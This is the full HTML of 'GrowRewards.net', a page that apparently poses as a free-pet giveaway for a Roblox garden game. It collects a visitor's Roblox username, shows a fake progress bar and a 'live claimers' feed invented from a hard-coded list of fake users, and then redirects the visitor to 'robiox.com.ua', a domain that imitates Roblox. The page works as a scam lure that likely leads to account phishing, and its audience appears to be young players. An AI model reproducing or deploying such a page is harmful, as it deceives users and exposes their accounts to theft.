<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GrowRewards.net</title>
  <style>
    @font-face {
      font-family: "PressStart2P";
      src: url("https://fonts.gstatic.com/s/pressstart2p/v11/e3t4euO8T-267oIAQAu6jDQyK3nYivw.ttf") format("truetype");
    }
    body {
      background-color: #001a00;
      font-family: "PressStart2P", monospace;
      color: #fff;
      text-align: center;
      font-size: 15px;
      font-weight: bold;
      user-select: none;
      cursor: default;
    }
    .neon-green {
      color: #00ff00;
      text-shadow: 0 0 6px #00ff00, 0 0 12px #00ff00;
    }
    .container {
      margin: 30px auto;
      max-width: 500px;
      background: #004d00;
      border: 4px solid #ff7f00;
      padding: 25px;
      border-radius: 8px;
    }
    .reward-box {
      background: #006600;
      border: 3px solid #fff;
      margin: 15px;
      padding: 18px;
      cursor: pointer;
      transition: all 0.2s ease;
      font-size: 13px;
    }
    .reward-box:hover {
      background: #009900;
    }
    .reward-box.selected {
      border: 3px solid #ff7f00;
      background: #004d00;
    }
    .reward-box img {
      width: 80px;
      height: 80px;
      display: block;
      margin: 0 auto 12px auto;
      pointer-events: none;
    }
    .reward-box, .reward-box * {
      user-select: none;
      cursor: default;
    }
    .button {
      display: inline-block;
      background: #ff7f00;
      padding: 14px 28px;
      margin-top: 20px;
      font-weight: bold;
      border: none;
      border-radius: 3px;
      text-decoration: none;
      color: #000;
      cursor: pointer;
      font-size: 13px;
      font-family: "PressStart2P", monospace;
    }
    .button:disabled {
      background: #333;
      color: #777;
      cursor: not-allowed;
    }
    .modal {
      display: none;
      position: fixed;
      z-index: 999;
      left: 0; top: 0;
      width: 100%; height: 100%;
      background-color: rgba(0,0,0,0.7);
    }
    .modal-content {
      background: #004d00;
      margin: 15% auto;
      padding: 25px;
      border: 4px solid #ff7f00;
      width: 340px;
      text-align: center;
      color: #ff7f00;
      font-family: "PressStart2P", monospace;
      font-size: 13px;
      font-weight: bold;
      user-select: none;
    }
    .modal-content input {
      width: 90%;
      padding: 12px;
      margin: 14px 0;
      font-size: 13px;
      border: 2px solid #ff7f00;
      text-align: center;
      font-family: "PressStart2P", monospace;
      font-weight: bold;
    }
    .modal-content button {
      background: #00ff00;
      border: none;
      padding: 12px 24px;
      font-weight: bold;
      cursor: pointer;
      font-size: 13px;
      font-family: "PressStart2P", monospace;
    }
    .live-claimers {
      margin: 25px auto;
      max-width: 500px;
      height: 190px;
      overflow: hidden;
      background: #004d00;
      border: 4px solid #ff7f00;
      padding: 18px;
      border-radius: 8px;
      text-align: left;
      font-family: "PressStart2P", monospace;
      font-size: 13px;
      font-weight: bold;
      user-select: none;
    }
    .live-claimers h2 {
      color: #ff7f00;
      text-shadow: 0 0 6px #ff7f00, 0 0 12px #ff7f00;
      font-size: 15px;
      margin-bottom: 12px;
    }
    .claimer-entry {
      margin: 6px 0;
      color: #00ff00;
    }
    /* Loading modal */
    #loadingModal .modal-content {
      width: 360px;
      background: #004d00;
      border: 4px solid #ff7f00;
      color: #ff7f00;
    }
    .progress-container {
      width: 100%;
      background: #002200;
      border: 2px solid #ff7f00;
      height: 28px;
      margin-top: 20px;
      position: relative;
    }
    .progress-bar {
      height: 100%;
      width: 0%;
      background: #00ff00;
      transition: width 0.2s;
    }
    .progress-text {
      position: absolute;
      left: 50%;
      top: 50%;
      transform: translate(-50%, -50%);
      color: #000;
      font-weight: bold;
      font-size: 12px;
      text-shadow: 0 0 6px #ff7f00, 0 0 12px #ff7f00;
    }
    @media (max-width: 600px) {
      body {
        font-size: 13px;
      }
      .reward-box img {
        width: 70px;
        height: 70px;
      }
      .container, .live-claimers {
        max-width: 95%;
        padding: 15px;
      }
    }
  </style>
</head>
<body>

  <h1 class="neon-green">GrowRewards.net</h1>
  <p>Don't forget to like, share, subscribe</p>

  <div class="container">
    <h2 style="color:#ff7f00">GrowRewards.net</h2>
    <div class="reward-box" onclick="selectReward(this, 'Candy Blossom Tree')">
      <img src="cbt.webp" alt="Candy Blossom Tree">
      CANDY BLOSSOM TREE
    </div>
    <div class="reward-box" onclick="selectReward(this, 'Kitsune')">
      <img src="kit.webp" alt="Kitsune">
      KITSUNE
    </div>
    <div class="reward-box" onclick="selectReward(this, 'Dragon Fly')">
      <img src="df.webp" alt="Dragon Fly">
      DRAGON FLY
    </div>
    <div class="reward-box" onclick="selectReward(this, 'Raccoon')">
      <img src="racc.webp" alt="Raccoon">
      RACCOON
    </div>
    <button class="button" id="claimBtn" disabled onclick="openModal()">CLAIM REWARD</button>
  </div>

  <div id="usernameModal" class="modal">
    <div class="modal-content">
      <p>ENTER YOUR ROBLOX USERNAME</p>
      <input type="text" id="usernameInput" placeholder="Your username">
      <br>
      <button onclick="confirmClaim()">CONFIRM</button>
    </div>
  </div>

  <div id="loadingModal" class="modal">
    <div class="modal-content">
      <p>PROCESSING YOUR PET REWARDS...</p>
      <p>PLEASE JOIN TO CLAIM YOUR CHOSEN PET</p>
      <div class="progress-container">
        <div id="progressBar" class="progress-bar"></div>
        <span id="progressText" class="progress-text">0%</span>
      </div>
    </div>
  </div>

  <div class="live-claimers">
    <h2>LIVE CLAIMERS!</h2>
    <div id="claimsFeed"></div>
  </div>

  <script>
    let selectedReward = null;

    function selectReward(element, reward) {
      document.querySelectorAll('.reward-box').forEach(box => {
        box.classList.remove('selected');
      });
      element.classList.add('selected');
      selectedReward = reward;
      document.getElementById("claimBtn").disabled = false;
    }

    function openModal() {
      document.getElementById("usernameModal").style.display = "block";
    }

    function confirmClaim() {
      const username = document.getElementById("usernameInput").value.trim();
      if (!username || !selectedReward) {
        alert("Please enter a username and select a reward!");
        return;
      }
      addClaimer(username, selectedReward);
      document.getElementById("usernameModal").style.display = "none";
      document.getElementById("usernameInput").value = "";
      startLoading();
    }

    function addClaimer(username, reward) {
      const feed = document.getElementById("claimsFeed");
      const entry = document.createElement("p");
      const now = new Date();
      const time = now.toLocaleTimeString();
      entry.textContent = `${username} claimed ${reward}  ${time}`;
      entry.classList.add("claimer-entry");
      feed.prepend(entry);
    }

    function startLoading() {
      const modal = document.getElementById("loadingModal");
      const bar = document.getElementById("progressBar");
      const text = document.getElementById("progressText");
      modal.style.display = "block";
      let progress = 0;
      bar.style.width = "0%";
      text.textContent = "0%";

      const interval = setInterval(() => {
        progress += 2;
        bar.style.width = progress + "%";
        text.textContent = progress + "%";
        if (progress >= 100) {
          clearInterval(interval);
          setTimeout(() => {
            window.location.href = "https://www.robiox.com.ua/games/126884695634066/Grow-a-Garden?privateServerLinkCode=74924073166174605294905811935352";
          }, 700);
        }
      }, 100);
    }

    const fakeUsers = ["LegendBuilder", "GirlyRoblox", "NoobSlayer", "PixelQueen", "DragonKing", "KittyKat", "ProGamer", "Dreamer123"];
    const rewards = ["Candy Blossom Tree", "Kitsune", "Dragon Fly", "Raccoon"];

    setInterval(() => {
      const user = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
      const reward = rewards[Math.floor(Math.random() * rewards.length)];
      addClaimer(user, reward);
    }, 5000);
  </script>
</body>
</html>
